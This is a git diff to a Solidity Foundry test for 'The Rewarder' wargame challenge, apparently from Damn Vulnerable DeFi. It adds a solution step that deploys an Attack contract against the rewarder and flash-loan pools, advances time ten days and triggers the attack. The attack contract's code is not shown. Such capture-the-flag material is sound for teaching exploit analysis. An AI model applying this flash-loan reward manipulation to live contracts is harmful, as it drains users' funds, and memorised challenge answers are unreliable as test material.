@@ -10,6 +10,9 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+// solution
+import {Attack} from "../../../src/Contracts/the-rewarder/Attack.sol";
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -24,6 +27,9 @@ contract TheRewarder is Test {
     address payable internal bob;
     address payable internal charlie;
     address payable internal david;
+
+    // solution
+    Attack public attack;
 
     function setUp() public {
         utils = new Utilities();
@@ -88,7 +94,16 @@ contract TheRewarder is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
 
+        address rewardTokenAddress = theRewarderPool.rewardToken.address;
+        attack = new Attack(theRewarderPool, dvt, flashLoanerPool, RewardToken(rewardTokenAddress));
+
+        vm.warp(block.timestamp + 10 days);
+
+        attack.attack();
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
